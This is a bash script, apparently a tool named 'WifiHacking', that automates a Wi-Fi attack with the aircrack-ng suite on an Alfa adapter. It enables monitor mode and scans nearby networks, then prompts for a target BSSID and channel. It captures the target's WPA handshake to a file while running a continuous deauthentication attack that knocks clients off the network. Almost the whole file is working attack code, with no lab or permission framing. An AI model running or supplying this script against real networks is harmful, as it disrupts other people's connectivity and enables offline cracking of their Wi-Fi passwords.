#!/bin/bash

# === ASCII Banner ===
echo -e "\e[1;32m
 __      __.__ _____.__   ___ ___        __   .__             
/  \\    /  \\__|/ ____\\__| /   |   \\_____  ____ |  | _|__| ____   ____ 
\\   \\/\\/   /  \\  __\\|  |/    ~    \\__  \\ _/ ___\\|  |/ /  |/    \\ / ___\\ 
 \\        /|  ||  |  |  |\\  Y  // __ \\\\  \\___|  <|  |  |  |\\/ /_/ >
  \\__/\\  / |__||__|  |__| \\___|_ /(____  /\\___  >__|_\\__|___| /\\___  / 
        \\/                      \\/      \\/     \\/     \\/        \\//_____/ 
      For Alfa Adapter AWUS036ACH (Realtek 88XXau)
\e[0m"

# === Colors ===
green()  { echo -e "\e[1;32m[+] $*\e[0m"; }
yellow() { echo -e "\e[1;33m[*] $*\e{0m"; }
red()    { echo -e "\e[1;31m[-] $*\e{0m"; }

# --- Define the monitor interface name ---
# This script is configured to use 'wlan0mon' directly.
# If your system creates a different name (e.g., 'mon0'), you will need to
# change the value of this variable accordingly.
MONITOR_INTERFACE="wlan0mon"

# --- Load the 88XXau module ---
sudo modprobe 88XXau || { red "Failed to load 88XXau module. Exiting."; exit 1; }
green "88XXau module loaded."

# === Trap CTRL+C ===
# This ensures that if the script is interrupted, monitor mode is taken down.
trap 'red "Interrupted. Taking down monitor mode on $MONITOR_INTERFACE and exiting..."; sudo ip link set "$MONITOR_INTERFACE" down 2>/dev/null; sudo service network-manager start 2>/dev/null; exit 1' INT

# === Make sure wlan0 exists ===
if ! iw dev | grep -q wlan0; then
    red "wlan0 not found. Make sure your Alfa adapter is connected."
    exit 1
fi

# === Start monitor mode ===
yellow "Checking for interfering processes and attempting to put wlan0 into monitor mode as $MONITOR_INTERFACE..."
sudo airmon-ng check kill || yellow "No interfering processes found or none to kill."

# Start monitor mode on wlan0. This command typically creates wlan0mon.
sudo airmon-ng start wlan0

# Verify that the expected monitor interface exists
if ! iw dev | grep -q "$MONITOR_INTERFACE"; then
    red "Failed to put wlan0 into monitor mode, or monitor interface '$MONITOR_INTERFACE' was not created."
    red "Please check 'iw dev' or 'ip a' to see the actual monitor interface name and adjust the script's MONITOR_INTERFACE variable if needed."
    # Attempt to restart network manager if monitor mode failed to start
    sudo service network-manager start 2>/dev/null
    exit 1
fi

green "$MONITOR_INTERFACE is now in monitor mode."

# === Start dumping (initial scan for 1 minute) ===
yellow "Starting airodump-ng for a 1-minute scan on $MONITOR_INTERFACE to identify networks."
yellow "Please note down the BSSID and Channel of your target network."

# Run airodump-ng in the background and kill it after 60 seconds
sudo airodump-ng "$MONITOR_INTERFACE" &
A_DUMP_PID=$! # Get the process ID of the background airodump-ng command

sleep 60 # Wait for 60 seconds

sudo kill "$A_DUMP_PID" 2>/dev/null # Kill the airodump-ng process
green "Initial airodump-ng scan complete after 1 minute."

# Read user input for BSSID and Channel
read -p "$(yellow "Enter the BSSID of the target network (e.g., AA:BB:CC:DD:EE:FF): ")" BSSID
read -p "$(yellow "Enter the Channel of the target network (e.g., 6): ")" Channel

# Basic input validation for BSSID and Channel (can be improved)
if [[ ! "$BSSID" =~ ^([0-9A-Fa-f]{2}:){5}([0-9A-Fa-f]{2})$ ]]; then
    red "Invalid BSSID format. Exiting."
    sudo ip link set "$MONITOR_INTERFACE" down 2>/dev/null
    sudo service network-manager start 2>/dev/null
    exit 1
fi

if ! [[ "$Channel" =~ ^[0-9]+$ ]] || [ "$Channel" -le 0 ] || [ "$Channel" -gt 165 ]; then
    red "Invalid Channel. Exiting."
    sudo ip link set "$MONITOR_INTERFACE" down 2>/dev/null
    sudo service network-manager start 2>/dev/null
    exit 1
fi

# === Start dumping target network in a new terminal ===
green "Starting airodump-ng on channel $Channel for BSSID $BSSID in a new terminal. This will capture the handshake."
gnome-terminal -- bash -c "sudo airodump-ng -c $Channel --bssid $BSSID -w captures \"$MONITOR_INTERFACE\"; exec bash" &

# Give a moment for airodump-ng to start in the new terminal
sleep 5

# === Perform deauthentication attack ===
yellow "Performing deauthentication attack against $BSSID. This will continuously send deauth packets."
yellow "Press Ctrl+C in this terminal to stop the deauth attack and clean up."
sudo aireplay-ng --deauth 0 -a "$BSSID" "$MONITOR_INTERFACE"

# === Cleanup (after deauth attack is stopped) ===
green "Deauthentication attack stopped. Taking down monitor mode on $MONITOR_INTERFACE."
sudo ip link set "$MONITOR_INTERFACE" down 2>/dev/null
sudo service network-manager start 2>/dev/null
green "Cleanup complete. Network Manager restarted."

exit 0
